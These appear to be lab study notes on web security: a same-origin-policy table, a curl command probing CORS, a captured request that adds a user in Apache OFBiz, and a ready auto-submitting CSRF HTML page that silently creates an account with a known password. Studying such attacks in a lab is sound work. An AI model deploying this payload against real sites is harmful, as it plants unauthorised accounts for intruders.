### Same Origin Policy 
```
URL	RESULT	REASON
https://foo.com/myInfo	Allowed	Same Origin
http://foo.com/users.json	Blocked	Different Scheme and Port
https://api.foo.com/info	Blocked	Different Domain
https://foo.com**:8443**/files	Blocked	Different Port
https://bar.com/analytics.js	Blocked	Different Domain
```
### curl requesting cors settings
```
curl -v -X OPTIONS http://192.168.154.155/exercise2
```
### CSRF(local test require apache2 service)
burp traffic of add user 
```
POST /webtools/control/createUserLogin HTTP/1.1
Host: ofbiz:8443
Connection: close
Content-Length: 178
Cache-Control: max-age=0
sec-ch-ua: ";Not A Brand";v="99", "Chromium";v="88"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://ofbiz:8443
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://ofbiz:8443/webtools/control/createnewlogin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=76A7BCC53C2B9BF49B21F99D2D8CA5D5.jvm1; OFBiz.Visitor=10000

enabled=&partyId=&userLoginId=test&currentPassword=password&currentPasswordVerify=password&passwordHint=&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=
```
Create html payload ofbiz.html
```
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://ofbiz:8443/webtools/control/createUserLogin" method="post" name="csrf">
  <input type="hidden" name="enabled">
  <input type="hidden" name="partyId">
  <input type="hidden" name="userLoginId" value="test">
  <input type="hidden" name="currentPassword" value="password">
  <input type="hidden" name="currentPasswordVerify" value="password">
  <input type="hidden" name="passwordHint">
  <input type="hidden" name="requirePasswordChange" value="N">
  <input type="hidden" name="externalAuthId">
  <input type="hidden" name="securityQuestion">
  <input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```
